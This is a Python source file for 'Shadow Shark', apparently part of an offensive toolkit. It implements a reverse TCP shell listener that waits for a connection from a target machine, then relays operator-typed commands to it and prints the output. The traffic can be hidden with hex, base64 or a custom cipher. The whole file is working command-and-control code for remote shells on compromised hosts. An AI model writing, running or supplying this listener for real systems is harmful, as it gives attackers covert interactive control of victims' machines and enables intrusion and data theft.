# -*- coding: utf-8 -*-
"""
The Shadow Shark listener.

@author: Mr. Shark Spam Bot
"""
import sys
import json
import socket
import codecs
import binascii
from lib.ShadowShark import colors
from lib.CadaverousCipher import CadaverousCipher as cc

class ShadowShark:
    '''The Shadow Shark listener.'''
    def __init__(self, lhost, lport, encryption, dictionary_key, key):
        self.lhost = lhost
        self.lport = lport
        self.encryption = encryption
        self.dictionary_key = dictionary_key
        self.key = key

    def encryption_handler(self, text, encode=False, decode=False):
        '''Encode or decode text using hex or base64.'''
        if encode is True:
            new_text = text.encode()
            if self.encryption == 'hex':
                new_text = codecs.encode(new_text, encoding='hex')
            if self.encryption == 'base64':
                new_text = codecs.encode(new_text, encoding='base64')
            new_text = new_text.decode()
            if self.encryption == 'cadaverouscipher':
                new_text = cc.encrypt(new_text, self.dictionary_key, self.key)
            new_text = json.dumps(new_text)
            new_text = new_text.encode()
        if decode is True:
            try:
                new_text = json.loads(text)
            except json.decoder.JSONDecodeError:
                new_text = text.decode()
            new_text = new_text.encode()
            if self.encryption == 'hex':
                try:
                    new_text = codecs.decode(new_text, encoding='hex')
                except binascii.Error:
                    pass
            if self.encryption == 'base64':
                new_text = codecs.decode(new_text, encoding='base64')
            new_text = new_text.decode()
            if self.encryption == 'cadaverouscipher':
                new_text = cc.decrypt(new_text, self.dictionary_key, self.key)
        return new_text

    def recv_infinite_data(self):
        '''Read an infinite amount of data from the socket.'''
        data = b''
        while True:
            try:
                data += self.connection.recv(1024)
                if not data:
                    break
                if data[-1] == 34:
                    break
            except ValueError:
                continue
        data = self.encryption_handler(data, decode=True)
        return data

    def listen(self):
        '''Accept the first incoming TCP connection.'''
        try:
            self.rev_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.rev_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                self.rev_socket.bind((self.lhost, self.lport))
            except OSError:
                print(f'{colors.RED}\n[-] LHOST is not set to your IP or a process is currently running on LPORT.{colors.NORMAL}')
                print(f'{colors.RED}[-] Terminating program.{colors.NORMAL}')
                sys.exit()
            self.rev_socket.listen(1)
            print(f'{colors.BLUE}[*] A reverse TCP handler on {self.lhost}:{self.lport} has successfully started...{colors.NORMAL}')
            self.connection, self.address = self.rev_socket.accept()
        except KeyboardInterrupt:
            print(f'{colors.YELLOW}\n[+] Ctrl + c detected.{colors.NORMAL}')
            print(f'{colors.RED}[-] Terminating program.{colors.NORMAL}')
            self.rev_socket.close()
            sys.exit()

    def interact(self):
        '''Interact with the target by using a reverse TCP shell.'''
        try:
            rhost = self.address[0]
            rport = self.address[1]
            print(f'{colors.GREEN}[+] A TCP connection from {rhost}:{rport} has been received.\n{colors.NORMAL}')
            try:
                while True:
                    self.connection.send(self.encryption_handler('directory', encode=True))
                    directory = self.recv_infinite_data()
                    command = input(f'{directory} ')
                    if command.lower().strip() == 'exit':
                        self.connection.send(self.encryption_handler('exit', encode=True))
                        self.connection.close()
                        self.rev_socket.close()
                        sys.exit()
                    if command == 'multiline':
                        print(f'{colors.YELLOW}\n[!] Press Ctrl + d once you are finished.{colors.NORMAL}')
                        command = sys.stdin.read()
                    if not command.strip():
                        continue
                    self.connection.send(self.encryption_handler(command, encode=True))
                    output = self.recv_infinite_data()
                    if output.strip():
                        print(output.strip())
            except ConnectionError:
                print(f'{colors.RED}\n[-] The reverse TCP connection was broken.{colors.NORMAL}')
                print(f'{colors.RED}[-] Terminating program.{colors.NORMAL}')
                self.connection.close()
                self.rev_socket.close()
                sys.exit()
        except KeyboardInterrupt:
            print(f'{colors.YELLOW}\n[+] Ctrl + c detected.{colors.NORMAL}')
            print(f'{colors.RED}[-] Terminating program.{colors.NORMAL}')
            self.connection.send(self.encryption_handler('exit', encode=True))
            self.connection.close()
            self.rev_socket.close()
            sys.exit()

    def main(self):
        '''Execute the listener.'''
        self.listen()
        self.interact()
